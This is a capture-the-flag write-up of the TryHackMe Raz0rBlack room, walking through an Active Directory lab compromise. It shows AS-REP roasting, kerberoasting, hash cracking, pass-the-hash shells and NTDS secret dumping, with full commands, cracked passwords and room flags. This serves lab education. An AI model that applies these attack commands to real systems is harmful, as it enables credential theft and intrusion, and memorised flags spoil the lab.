# Raz0rblack room

This is my write of TryHackMe's [Raz0rBlack](tryhackme.com/room/raz0rblack) room.

## Heads up

In this article I used the dns name RAZ0RBLACK.THM, and some ip addresses like 10.10.63.133 and others to refer to the same machine. It takes some time to solve one of this rooms and many times the ip addresses change, At the time of writing this article I preferred to keep my footage as verbatim as possible.


## Acknowledgments

To solve this room I used parts of [Animesh Roy's article](https://classroom.anir0y.in/post/tryhackme-raz0rblack), in particular the bits I used were related to password re-use and finding out current users hashes. I will point in the article where I relied on Animesh's article to unblock myself on the resolution of this room.
The rest of the article is my own work.

I used  [Luis Vacas's Backup To System article](https://www.hackplayers.com/2020/06/backup-tosystem-abusando-de-los.html) to perform privilege escalation and create a local administrator account.
I will refer to this reference at the relevant point.

## First scan

The first step is to scan the machine with nmap. Note that I used the nfs-showmount script to list the nfs mounts available.

```
└─$ sudo nmap -sS RAZ0RBLACK.THM --script nfs-showmount
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-22 14:50 EDT
Nmap scan report for RAZ0RBLACK.THM (10.10.246.154)
Host is up (0.076s latency).
Not shown: 986 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
| nfs-showmount: 
|_  /users 
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2049/tcp open  nfs
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
```

From the nmap results we know we are dealing with a windows machine, since it has the netbios, kerberos and ldap ports open, but it is also interesting that it has also nfs and rpcbind ports open more common in the unix/linux world.

## Inspecting the /users share - first flag

From the scan results above, we also learned that there is a /users share. We proceed to mount it on the attacker machine:

```
└─$ sudo mount -t nfs RAZ0RBLACK.THM:/users /mnt/test -o nolock
```

We can list then the contents of the mount point to learn that there are 2 files available, sbradley.txt containing the Steven's flag inside and employee_status.xsls.

```
┌──(root@kali)-[~]
└─# cd /mnt/test 
                                                                                                                                                                                                                  
┌──(root@kali)-[/mnt/test]
└─# ls    
employee_status.xlsx  sbradley.txt
                                                                
```

The flag of the user Steven Bradley, is contained in the file sbradley.txt:

anonthis
```
┌──(root@kali)-[/mnt/test]
└─# cat sbradley.txt 
THM{ab53e05c9a98def00314a14ccbfa8104}
```

We can see the contents of the spreadsheet in the screen capture below:

![](file:///home/kali/tryhackme/raz0rblack/employee_spreadsheet.png)

It's worth noting these 3 users, as we'll see them further down the line:

- Steven Bradley: Stego specialist
- Tyson Williams: Reverse Engineering
- Ljudmila Vetrova: Active directory admin

## Probing kerberos

With the previously gathered intelligence, we can craft a file with usernames that we can use to probe kerberos using kerbrute.

```
┌──(kali㉿kali)-[~/kerbrute/dist]
└─$ cat users 
ljudmila.vetrova
lvetrova
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
rdelgado
twilliams
sbradley
clin
```

```
┌──(kali㉿kali)-[~/kerbrute/dist]
└─$ ./kerbrute_linux_amd64 userenum -d RAZ0RBLACK.THM --dc RAZ0RBLACK.THM users                                                                                                                               1 ⨯

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 07/22/21 - Ronnie Flathers @ropnop

2021/07/22 13:16:07 >  Using KDC(s):
2021/07/22 13:16:07 >   RAZ0RBLACK.THM:88

2021/07/22 13:16:07 >  [+] VALID USERNAME:       lvetrova@RAZ0RBLACK.THM
2021/07/22 13:16:08 >  [+] VALID USERNAME:       sbradley@RAZ0RBLACK.THM
2021/07/22 13:16:08 >  [+] twilliams has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$twilliams@RAZ0RBLACK.THM:fd5acad30269e3379021bc914eefc854$bfbc5131bb7b81af44029585d70d28cf38f7bf9c2d5a32a49bd0b1b47c1ba8b0939cce75e8bb3b9be66528a2045b9c844dd8f3bc4476805d699eb9339855db0d8c78fd7af8dbffe25b12e3521c965af4d623b2c386497ee2081013a4b1e2a19a23b4229eadb86891f0936426adbd0e7a410eca29f6651d1d78ebfd29d13377f739deebc748701ef73ab4e861f1021cae44ecc24ceccade57cdf9f1dae7fedab75b967306534f640156fe3e90c7d463fde162e2d4f81a156217d141e578093fc754c8dfbfaf809afbdba2f4a5e58c32323a23c80e0a32cf69c0ec1f6ccac178a29ee73ba17180261c7988a4fbd259039a9d12114842bc9cf74106d9989735043ed3f966b4                                      
2021/07/22 13:16:08 >  [+] VALID USERNAME:       twilliams@RAZ0RBLACK.THM
2021/07/22 13:16:08 >  Done! Tested 13 usernames (3 valid) in 0.099 seconds
```

The output from above tells us something new, the user twilliams has no pre auth required. We can use the impacket tool GetNPUsers then and obtain a Kerberos TGT.

```
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 GetNPUsers.py RAZ0RBLACK.THM/twilliams -no-pass                                                                                                                                                 130 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for twilliams
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3364529499a88671db4f35e5f92a983d$17bd3a129f2ba2c767d46843a9b0ce212453726a3b7d2ac377910f3e49f98472c9a8c28e17c03a54ccbf1832a117e5b5532e3fe00df3b9f4174b2e50e2ef96a127901cf274bc5ce506a32bfab02f6877c22db1f93737ec82449627663653daffebab02fd5fc1b9b31d8b445bde9f6f21d4ccb28fcf5d0aa5be99607b475808e860cef15c5cc02b288ad53bf4118c254f3945274e50dc3843793631bbd0c142df7f263e253f08cc00cfe8e452d0e956acb611647dcfb8f21dfd2529fdba1af54f9a003a32f6a268b07caf9da9729bf77845922e4a01f09c89ad7344f866f4b41d61bc127ae09bd57182a13dfa52301b84
                                                                                                                         
```

The kerberos TGT above can be cracked using hashcat to obtain the twilliams user password:

```
                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ hashcat -m 18200 --force hashTwilliams  /usr/share/wordlists/rockyou.txt                                                                                                                                255 ⨯
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 2861/2925 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 134 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3364529499a88671db4f35e5f92a983d$17bd3a129f2ba2c767d46843a9b0ce212453726a3b7d2ac377910f3e49f98472c9a8c28e17c03a54ccbf1832a117e5b5532e3fe00df3b9f4174b2e50e2ef96a127901cf274bc5ce506a32bfab02f6877c22db1f93737ec82449627663653daffebab02fd5fc1b9b31d8b445bde9f6f21d4ccb28fcf5d0aa5be99607b475808e860cef15c5cc02b288ad53bf4118c254f3945274e50dc3843793631bbd0c142df7f263e253f08cc00cfe8e452d0e956acb611647dcfb8f21dfd2529fdba1af54f9a003a32f6a268b07caf9da9729bf77845922e4a01f09c89ad7344f866f4b41d61bc127ae09bd57182a13dfa52301b84:roastpotatoes
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$twilliams@RAZ0RBLACK.THM:3364529499a8...301b84
Time.Started.....: Thu Jul 22 14:11:00 2021, (4 secs)
Time.Estimated...: Thu Jul 22 14:11:04 2021, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1176.1 kH/s (8.35ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4227072/14344385 (29.47%)
Rejected.........: 0/4227072 (0.00%)
Restore.Point....: 4210688/14344385 (29.35%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: rociomargonari -> rmhaey

Started: Thu Jul 22 14:10:43 2021
Stopped: Thu Jul 22 14:11:05 2021
```

After getting the password I tried obtaining data from ldap using  ldapdomaindump, and from SMB using enum4linux. That returned a load of data, but nothing relevant to share.

Perhaps the most interesting thing to show are these extracts from the enum4linux output.
The first one listing the current domain users.
```
[+] Getting domain group memberships:
Group 'Group Policy Creator Owners' (RID: 520) has member: RAZ0RBLACK\Administrator
Group 'Domain Controllers' (RID: 516) has member: RAZ0RBLACK\HAVEN-DC$
Group 'Domain Admins' (RID: 512) has member: RAZ0RBLACK\Administrator
Group 'Schema Admins' (RID: 518) has member: RAZ0RBLACK\Administrator
Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\Administrator
Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\krbtgt
Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\xyan1d3
Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\lvetrova
Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\sbradley
Group 'Domain Users' (RID: 513) has member: RAZ0RBLACK\twilliams
Group 'Domain Guests' (RID: 514) has member: RAZ0RBLACK\Guest
Group 'Enterprise Admins' (RID: 519) has member: RAZ0RBLACK\Administrator
```

It is worth noting that our 3 usual suspects from the spreadsheet are still listed as members of the Raz0rBlack domain:
- lvetrova
- sbradley
- twilliams

As usual there is a super admin named Administrator, but we found a new one worth to keep an eye on:
- xyan1d3

The second one listing the shares.
```
 ========================================= 
|    Share Enumeration on 10.10.49.242    |
 ========================================= 
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
do_connect: Connection to 10.10.49.242 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        trash           Disk      Files Pending for deletion
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.49.242
//10.10.49.242/ADMIN$   Mapping: DENIED, Listing: N/A
//10.10.49.242/C$       Mapping: DENIED, Listing: N/A
//10.10.49.242/IPC$     [E] Can't understand response:
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
NT_STATUS_INVALID_INFO_CLASS listing \*
//10.10.49.242/NETLOGON Mapping: OK, Listing: OK
//10.10.49.242/SYSVOL   Mapping: OK, Listing: OK
//10.10.49.242/trash    Mapping: OK     Listing: DENIED
```

The thrash share above is interesting. We can't list its contents with the user twilliams, perhaps another user can...

## Checking for password re-use

For this section I consulted Animesh's article to unblock me.
Password re-use is a popular evil in the security field. After trying the password we know for the domain users above, we found that sbradley accepts the current password, but request a password change:

```
──(kali㉿kali)-[~/tryhackme/raz0rblack]
└─$ crackmapexec smb RAZ0RBLACK.THM -u sbradley -p roastpotatoes
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.75.170    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.75.170    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
```

We change the password using the smbpasswd command:
```
┌──(kali㉿kali)-[~/tryhackme/raz0rblack]
└─$ smbpasswd -r RAZ0RBLACK.THM -U sbradley                                                                                                                           1 ⨯
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user sbradley
```

## Accessing the thrash share

After changing the password for the user sbradley I was able to gain access to the thrash share.

```
─$ smbclient  \\\\RAZ0RBLACK.THM\\trash -U sbradley                                                                                                                130 ⨯
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Enter WORKGROUP\sbradley's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 02:01:28 2021
  ..                                  D        0  Tue Mar 16 02:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 14:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 02:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 14:24:21 2021
```

The sbradley.txt file contains the same flag we already got by mounting the nfs share.

The chat log contains a short extract of a chat conversation between the user sbradley and the Administrator. From the extract we learned 2 important things:

-  that the Raz0rblack domain controller was vulnerable at some point to CVE-2020-1472 (ZeroLogon)
- The user sbradley created a password protected zip file containing the ntds.dit and the SYSTEM.hive and uploaded the zip in the thrash share.

From the above, we know what could be inside the experiment_gone_wrong.zip file.

As mentioned above the file experiment_gone_wrong is password protected. I tried the password we already know with no luck, so I turned to trying to crack it with john the ripper.

We use the zip2john tool to read the zipfile and produce a hash that we could use to be cracked with john:

```
└─$ zip2john experiment_gone_wrong.zip > zhash
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: 2b chk, TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: 2b chk, TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Then we use john with the rockyou.txt wordlists to try to find out the password:

```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zhash                                                                                                            1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
anonthis
electromagnetismo (experiment_gone_wrong.zip)
1g 0:00:00:00 DONE (2021-07-25 15:59) 1.449g/s 12145Kp/s 12145Kc/s 12145KC/s elephantmeee..elanore67
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Luckily the zip file password was in the rockyou.txt wordlist.

We can use it to extract the content from the zip file:

```
└─$ unzip experiment_gone_wrong.zip 
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password: 
password incorrect--reenter: 
  inflating: system.hive             
  inflating: ntds.dit
```
  
## Extracting secrets from the dump found in the thrash share
 
 
We can use impacket's secretsdump tool to get the hashes from the dump we found on the thrash share.

```
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds /home/kali/tryhackme/raz0rblack/ntds.dit -system /home/kali/tryhackme/raz0rblack/system.hive  LOCAL -outputfile /home/kali/tryhackme/raz0rblack/secretdump_out
```

From the secretsdump output we can get all the NT hashes, note that for the following 2 steps I used Animesh's article to unblock me.

```
└─$ cat secretdump_out.ntds | cut -d ":" -f 4 > nt_hashes.txt
```

Here is the important bit I got from Animesh's article, a way to bruteforce all the hashes we got, to see if anyone matched the one from the user lvetrova:

```
crackmapexec smb MACHINE_IP -u lvetrova -H nt_hashes.txt
...[snip]...
SMB         MACHINE_IP    445    HAVEN-DC         [+] raz0rblack.thm\lvetrova f220d3988deb3f516c73f40ee16c431d
```

As shown above, we found that the hash f220d3988deb3f516c73f40ee16c431d, previously belonging to user n.cox now matches the current lvetrova user.

```
└─$ grep "f220d3988deb3f516c73f40ee16c431d" secretdump_out.ntds
RAZ0RBLACK\n.cox:4612:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
```

## Shell as lvetrova

After obtaining the correct NT hash, we can use evil-winrm to get a shell using the pass the hash technique.

```
└─$ evil-winrm  -i  10.10.63.133 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d                                                  1 ⨯

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lvetrova\Documents> 

*Evil-WinRM* PS C:\Users\lvetrova\Documents> cd ..
*Evil-WinRM* PS C:\Users\lvetrova> dir


    Directory: C:\Users\lvetrova


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:14 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:16 AM           1692 lvetrova.xml
```

The lvetrova.xml file, found in C:\Users\lvetrova, contains a password inside.
Using some Powershell we can extract the contents of the credential file:

```
*Evil-WinRM* PS C:\Users\lvetrova> type lvetrova.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Your Flag is here =&gt;</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
    </Props>
  </Obj>
</Objs>
*Evil-WinRM* PS C:\Users\lvetrova> 

*Evil-WinRM* PS C:\Users\lvetrova> $credential = Import-CliXml -Path 'lvetrova.xml'
*Evil-WinRM* PS C:\Users\lvetrova> $credential.GetNetworkCredential().Password
anonthis
THM{694362e877adef0d85a92e6d17551fe4}
```

The credential file contained Lludmila's flag. Now is time to get the others.

## Getting access as xyan1d3

I relied on Animesh's article to move on to taking this account.
Using the previous lvetrova hashes we can get a TGS ticket to crack offline using the impacket tool GetUserSPNs.
For more information on how this attack works [check this article](https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/)

```
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.63.133 raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes.kerberoasted
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>               
```

```
└─$ cat hashes.kerberoasted                                    
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$6de0193a7673c6e62df419238ad76527$d395e0095763e4ce11ba6be95be475462f3d90cac67af1806dff56ed9e48a098e0d1a3a7b88b756f471b62a56353cf412aa6cae5484f01eddb53c6deceb51e52aa86f21ef6cab8396b06830e308176595f935176e761619eb94489dcc74b6f75ed6bdd4f6257c1792ae14842364b72809db19401bc3ed43c3336ff5f17e504eabd41e64ef9a6cc62ca41c3a8c929a5ca628a3dc49771dff5b13e72192ad30dc4fbfc71964b376d3d95388e29fd5248f8a22e525e9d10516b34ca520342ac5378e1922157834e7dfb6aed8e820eeb784b7bbe238b961ba921ea2d522ab606ceba1e97bba13933242e031709539eb75460bbd1964ee91ac59b0661bd3c4c22db7044cb4bc31972f6857b12fd38044e4eabbcfe8961d6bb00727a37a42e79e69157f938e625b6e03e2d8c9d919b1e40590c49727ba75612ed609812aecbbf5539c7d497d0c911cbec4f3ed4ea7798af894d5f7db7208e9040b5adbddaa365d9b070135cd99868bb967347a0d64730741d787aeb88524c9a8c85c478811e8657f3a41f03755935d8d8c2656fdc3496d502f56bf529f66f2138c383680ccb67756e408870a000e2038679f64ed87113ad6915a1f59b5a5dbb0736ff51ce4bf0c4f67bab496637fb46865011b1971e79766c245eb9d7da046299c08a78281056e078a95b6def6fbadc9810b66db5c91b879986f6388a0aa1c05594e6e127054bf98228454a3b5245e0e9e527822970682a83b4987b411d1e130e84e4eee0bcbcea61c7ccbc3e6b31bbcc34eb433d843f5d79aa05858214cc1e9aad44b6d3d409e4db4c159c6f1aad37cf3391aeea80c1d69d00f3e9a9ec46faf68ccf84f37b81da9aeb54330e0073191e36fcb6280e74ed36cab5f7e8a4edd3a0a459f5868c44b2797178cc2981c073d7107e4540a48f4aa3f99311dde23769bc377fbb2e23108217a18eb4ed84e8afd0b1bb9b11e39a5e917a62928e1d9d417a0d333b5a99b38a0f000d7a40d62aaae73fb38010f0a9f03df0dfe1913c6b494f71f90c2fde898062dcc5c68759c7bb2d1492e6543b74676d8a1c1ba8f5ab85dd0d71e4777a9f65d5ef9ec3dccc21ac1694f95de664c94961e63dd9a1f260bc35a02bb75fbf073ad8cb238959ae4ef8f6cfc0ed2806e80a8b7cd5adfeecf509b78494e9efa95c1f90a85b9799f73117607faf09f85472661a946ab3120c24d2d8e2703a545861f253cbc005741e1913dcf057437726fc61c0d7a6864a7f6ccc9d57f959529c68fcb5c230c9cf525948a2b6007795ec914688b0d6a01407159c6d887215029e0e42c4f1eb412831e1c5a35f43568a25aaa2fe189718c7bba74ac7caf953acbf8ce7d088d6bd85e6638ed1541acb95c7e5c208c4452af487e0b38c9f82d13b1fd52387dccd62e3f8b9c5188c15363ab439e567
```

The TGS hash above can be cracked using hashcat to obtain xyan1d3's password:

```
└─$ hashcat -m 13100 --force  hashes.kerberoasted /usr/share/wordlists/rockyou.txt                                              130 ⨯
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 2861/2925 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Initializing backend runtime for device #1...

Host memory required for this attack: 134 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$6de0193a7673c6e62df419238ad76527$d395e0095763e4ce11ba6be95be475462f3d90cac67af1806dff56ed9e48a098e0d1a3a7b88b756f471b62a56353cf412aa6cae5484f01eddb53c6deceb51e52aa86f21ef6cab8396b06830e308176595f935176e761619eb94489dcc74b6f75ed6bdd4f6257c1792ae14842364b72809db19401bc3ed43c3336ff5f17e504eabd41e64ef9a6cc62ca41c3a8c929a5ca628a3dc49771dff5b13e72192ad30dc4fbfc71964b376d3d95388e29fd5248f8a22e525e9d10516b34ca520342ac5378e1922157834e7dfb6aed8e820eeb784b7bbe238b961ba921ea2d522ab606ceba1e97bba13933242e031709539eb75460bbd1964ee91ac59b0661bd3c4c22db7044cb4bc31972f6857b12fd38044e4eabbcfe8961d6bb00727a37a42e79e69157f938e625b6e03e2d8c9d919b1e40590c49727ba75612ed609812aecbbf5539c7d497d0c911cbec4f3ed4ea7798af894d5f7db7208e9040b5adbddaa365d9b070135cd99868bb967347a0d64730741d787aeb88524c9a8c85c478811e8657f3a41f03755935d8d8c2656fdc3496d502f56bf529f66f2138c383680ccb67756e408870a000e2038679f64ed87113ad6915a1f59b5a5dbb0736ff51ce4bf0c4f67bab496637fb46865011b1971e79766c245eb9d7da046299c08a78281056e078a95b6def6fbadc9810b66db5c91b879986f6388a0aa1c05594e6e127054bf98228454a3b5245e0e9e527822970682a83b4987b411d1e130e84e4eee0bcbcea61c7ccbc3e6b31bbcc34eb433d843f5d79aa05858214cc1e9aad44b6d3d409e4db4c159c6f1aad37cf3391aeea80c1d69d00f3e9a9ec46faf68ccf84f37b81da9aeb54330e0073191e36fcb6280e74ed36cab5f7e8a4edd3a0a459f5868c44b2797178cc2981c073d7107e4540a48f4aa3f99311dde23769bc377fbb2e23108217a18eb4ed84e8afd0b1bb9b11e39a5e917a62928e1d9d417a0d333b5a99b38a0f000d7a40d62aaae73fb38010f0a9f03df0dfe1913c6b494f71f90c2fde898062dcc5c68759c7bb2d1492e6543b74676d8a1c1ba8f5ab85dd0d71e4777a9f65d5ef9ec3dccc21ac1694f95de664c94961e63dd9a1f260bc35a02bb75fbf073ad8cb238959ae4ef8f6cfc0ed2806e80a8b7cd5adfeecf509b78494e9efa95c1f90a85b9799f73117607faf09f85472661a946ab3120c24d2d8e2703a545861f253cbc005741e1913dcf057437726fc61c0d7a6864a7f6ccc9d57f959529c68fcb5c230c9cf525948a2b6007795ec914688b0d6a01407159c6d887215029e0e42c4f1eb412831e1c5a35f43568a25aaa2fe189718c7bba74ac7caf953acbf8ce7d088d6bd85e6638ed1541acb95c7e5c208c4452af487e0b38c9f82d13b1fd52387dccd62e3f8b9c5188c15363ab439e567:cyanide9amine5628
anonthis
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/...39e567
Time.Started.....: Tue Jul 27 09:34:31 2021, (8 secs)
Time.Estimated...: Tue Jul 27 09:34:39 2021, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1146.0 kH/s (9.05ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8880128/14344385 (61.91%)
Rejected.........: 0/8880128 (0.00%)
Restore.Point....: 8863744/14344385 (61.79%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: cynthia73 -> cutectotoy

Started: Tue Jul 27 09:34:15 2021
Stopped: Tue Jul 27 09:34:40 2021

```

## Shell as xyan1d3 - getting the xyan1d3 flag

We can use the previously found password to get a shell into the system as xyan1d3.

```
└─$ evil-winrm  -i  10.10.63.133 -u xyan1d3 -p cyanide9amine5628                    

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd ..
*Evil-WinRM* PS C:\Users\xyan1d3> dir


    Directory: C:\Users\xyan1d3


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021   9:34 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml
```

As done with the lvetrova user, we get the flag from the xyan1d3.xml file.

```
*Evil-WinRM* PS C:\Users\xyan1d3> $credential = Import-CliXml -Path 'xyan1d3.xml'
*Evil-WinRM* PS C:\Users\xyan1d3> $credential.GetNetworkCredential().Password
LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
*Evil-WinRM* PS C:\Users\xyan1d3> 
```

This user in particular is a member of the Backup Operators group and has the SeBackupPrivilege enabled. We'll see in the next section how to abuse that to execute commands as System in the next section

```
